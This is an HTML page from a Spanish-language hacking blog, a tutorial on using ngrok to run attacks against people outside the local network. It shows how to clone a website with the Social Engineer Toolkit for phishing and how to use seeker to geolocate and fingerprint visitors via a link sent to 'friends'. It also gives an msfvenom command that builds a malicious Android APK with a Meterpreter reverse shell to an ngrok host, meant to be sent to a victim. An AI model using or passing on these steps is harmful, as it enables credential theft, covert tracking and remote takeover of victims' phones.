<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-156451356-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'UA-156451356-1');
    </script>
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">

    <link rel="icon" type="image/jpg" href="../Images/Erik172Logo.jpg" />

    <meta name="author" content="Erik172">

    <link rel="stylesheet" href="../style.css">
    <link rel="stylesheet" href="../Images/style.css">

    <title>Z0172CK</title>
</head>
<body>
    <div id="particles-js"></div>

    <div class="social">
		<ul>
            <li><a href="https://www.facebook.com/Z0172ck-102262774651238/" target="_blank" class="icon-facebook2"></a></li>
            <li><a href="https://github.com/Erick172" target="_blank" class="icon-github"></a></li>
			<!--<li><a href="http://www.twitter.com/falconmasters" target="_blank" class="icon-twitter"></a></li>
			<li><a href="http://www.googleplus.com/falconmasters" target="_blank" class="icon-googleplus"></a></li>
			<li><a href="http://www.pinterest.com/falconmasters" target="_blank" class="icon-pinterest"></a></li>-->
			<li><a href="mailto:z0172ck@z0172ck.me" class="icon-mail"></a></li>
		</ul>
    </div>

    <header>
        <div class="menu">
            <div class="navbar navbar-expand-lg navbar-dark bg-black fixed-top p-2">
                <nav>
                    <div class="container">
                        <a class="navbar-brand" href="index.html">
                            <img src="../Images/Erik172Logo.jpg" alt="Erik172 Z0172CK Logo" width="30" height="30"> Z0172CK 
                            <span class="text-muted">V0.0.8</span> 
                        </a>
                    </div>
                </nav>
            </div>
        </div>

        <div class="submenu">
            <div class="subcontenedor">
                <nav>
                    <ul id="sublist">
                        <li><a href="../index.html">Inicio</a></li>
                        <li><a href="../Windows/windows.html">Windows</a></li>
                        <li><a href="../Linux/linux.html">Linux</a></li>
                        <li><a href="../hacking.html">Hacking</a></li>
                    </ul>
                </nav>
            </div>
        </div>

    <div class="texto">
        <h2>
            Metasploit + Ngrok: Ataque Fuera de Lan
        </h2>
        <br>
        <p>Z0172CK</p>
    </div>

    <div class="principal contenedor">
        <article>
            <h2 class="titulo">¿Que es Ngrok?</h2>
            <br>
            <p>
                Es una herramienta con la que podemos crear un tunel accesible a traves de un dominio que nos asigna la propia aplicacion, para asi acceder a un servidor local. 
            </p>

            <center><img src="../Images/Metasploit+Ngrok/img1.png" alt="Que es Ngrok"></center>
            <br><br><br>

            <p>
                Vamos a su sitio web <a href="https://ngrok.com">https://ngrok.com/</a> y nos registramos, y descargamos su cliente.
            </p>

            <center><img src="../Images/Metasploit+Ngrok/img2.png" alt="Ngrok Init"></center>
            <br><br><br>

            <p>
                Nota: En la versión gratuita esta url se genera cada que ejecutemos ngrok , sin embargo con la opcion de pago podemos configurar subdominios permanentes y otras opciones mas avanzadas que harán mas facil nuestro trabajo.
            </p>
        </article>

        <article>
            <h2 class="titulo">Instalacion</h2>
            <br>
            <p>
                Luego de descargar nuestro cliente vamos a conectarnos a nuestra cuenta con el authtoken que se genera cuando ingresamos a nuestra cuenta.
            </p>

            <pre class="eckosc_syntax eckosc_syntax_theme_dark hljs sql">
                <code>
                    ./ngrok authtoken <span class="hljs-keyword">TOKEN</span>
                </code>
            </pre>
        </article>

        <article>
            <h2 class="titulo">SET (social engineer toolkit) con Ngrok </h2>
            <br>

            <p>
                Luego de la instalacion de Ngrok vamos a empezar a jugar realizando pruebas con una herramienta que ya todos conocemos para realizar ataques de ingenieria social, vamos a realizar el ejemplo mas clasico que seria clonar un sitio web.
            </p>

            <p>
                Iniciamos nuestro servicio de apache
            </p>
            
            <pre class="eckosc_syntax eckosc_syntax_theme_dark hljs sql">
                <code>
                    service apache2 <span class="hljs-keyword">start</span>
                </code>
            </pre>

            <p>
                Para ello vamos a crear un tuner http con ngrok que apunte al puerto 80. 
            </p>

            <pre class="eckosc_syntax eckosc_syntax_theme_dark hljs sql">
                <code>
                    ./ngrok http <span class="hljs-keyword">80</span>
                </code>
            </pre>

            <center><img src="../Images/Metasploit+Ngrok/img3.png" alt="Tunnel en el puerto 80"></center>
            <br><br><br>

            <p>
                Ahora vamos habilitar que apache2 funcione con set en el archivo local /etc/setoolkit/set.config. Buscamos la linea
            </p>

            <pre class="eckosc_syntax eckosc_syntax_theme_dark hljs sql">
                <code>
                    APACHE_SERVER=OFF  
                </code>
            </pre>

            <p>
                y cambiamos OFF por ON, guardamos los cambios y procedemos a ejecutar setoolkit y a utilizar el modulo de Site Cloner. 
            </p>

            <p>
                Procedemos a la configuracion del modulo de la siguiente forma 
            </p>
            <center><img src="../Images/Metasploit+Ngrok/img4.png" alt="Config"></center>
            <br><br><br>

            <p>
                Cuando se crea el tunel genera un index.html por default, asi que se recomiendo renombrar el index2.html que contiene el sitio web clonado. 
            </p>

            <p>
                Fuck yeah! cuando ingresamos a la url de ngrok obversvamos nuestro sitio web clonado. 
            </p>
        </article>

        <article>
            <h2 class="titulo">Geolocalizacion de Dispositivos </h2>
            <br><br><br>

            <p>
                Continuando con nuestro post, ahora veremos seeker una herramienta escrita en python que ya incluye ngrok con la cual podemos geolocalizar dispositivos. Con esta herramienta podemos extraer la siguiente informacion si el visitante acepta los permisos que la plataforma web pide.
            </p>

            <ul>
                <li>Longitud</li>
                <li>Latitud</li>
                <li>Exactitud</li>
            </ul>

            <p>Sin permisos del usuario podemos obtener la siguiente informacion.</p>

            <ul>
                <li>Sistema operativo</li>
                <li>Plataforma</li>
                <li>Numero de nucleos de CPU</li>
                <li>Cantidad de RAM – Resultados aproximados</li>
                <li>Resolucion de la pantalla</li>
                <li>Informacion de GPU</li>
                <li>Nombre y version del navegador</li>
                <li>Dirrecion IP Publica</li>
            </ul>

            <br>
            <h2 class="titulo">Instalacion</h2>
            <br>
            <p>
                Clonamos el repositoria de git y Ejecutamos el script de instalacion.
            </p>

            <pre class="eckosc_syntax eckosc_syntax_theme_dark hljs sql">
                <code>
                    git <span class="hljs-keyword">Clone</span> https://github.com/thewhiteh4t/seeker.git
                    ./install.sh
                    python seeker.py
                </code>
            </pre>

            <center><img src="../Images/Metasploit+Ngrok/img7.png" alt="Seeker"></center>
            <br><br><br>

            <p>
                Ahora solo queda enviar la url generada con la herramienta a nuestros amigos...
            </p>

            <center><img src="../Images/Metasploit+Ngrok/img8.png" alt="Listo Seeker"></center>
            <br><br><br>
        </article>

        <article>
            <h2 class="titulo">Metasploit con Ngrok</h2>
            <br>

            <p>
                Como ultimo ejemplo vamos a realizar un ataque con msfvemon, en este caso usaremos el ataque mas simple generando un backdoor y enviando a la victima. Como en el ejemplo con setoolkit vamos a crear un tunel solo que en este caso sera TCP en el cual se va apuntar al puerto 1337.
            </p>

            <pre class="eckosc_syntax eckosc_syntax_theme_dark hljs sql">
                <code>
                    ./ngrok tcp <span class="hljs-keyword">1337</span>
                </code>
            </pre>

            <center><img src="../Images/Metasploit+Ngrok/img9.png" alt="Ngrok Init"></center>
            <br><br><br>

            <p>
                Como se observa tenemos tcp://0.tcp.ngrok.io:14422
            </p>

            <ul>
                <li>0.tcp.ngrok.io  - Host apuntando a localhost</li>
                <li>14422   - puerto apuntado al puerto 1337</li>
            </ul>

            <p>
                Generando nuestro apk malicioso.14422
            </p>

            <pre class="eckosc_syntax eckosc_syntax_theme_dark hljs sql">
                <code>
                    msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=14422 R > /root/Z0172CK.apk
                </code>
            </pre>

            <p>
                Ahora pondremos a la escucha nuestro handler
            </p>

            <center><img src="../Images/Metasploit+Ngrok/img10.png" alt="Listen Payload"></center>
            <br><br><br>

            <p>
                y cuando la victima instale el apk malicioso...
            </p>

            <center><img src="../Images/Metasploit+Ngrok/img11.png" alt="OK"></center>
            <br><br><br>
        </article>
    </div>

    <footer class="footer-blog">
        <div class="wrapper">
            <h2 class="footer-blog-title"> 
                <a href="https://z0172ck.me" itemprop="headline">
                    <img src="../Images/Erik172Logo.jpg" alt="Erik172" width="150" height="150">
                </a>
            </h2>

            <p class="footer-blog-description">Hacemos las cosas faciles. Aprende con nosotros y sientete apasionado por la tecnologia e informatica. Z0172CK</p>
        </div> 
    </footer>

    <script src="https://code.jquery.com/jquery-latest.js"></script>
    <script src="../particles.js" type="text/javascript"></script>
    <script src="../app.js" type="text/javascript"></script>

    <script>
        $(document).ready(function(){
 
        $('.ir-arriba').click(function(){
            $('body, html').animate({
                scrollTop: '0px'
            }, 300);
        });

        $(window).scroll(function(){
            if( $(this).scrollTop() > 0 ){
                $('.ir-arriba').slideDown(300);
            } else {
               $('.ir-arriba').slideUp(300);
            }
        });

       });
    </script>
</body>
</html>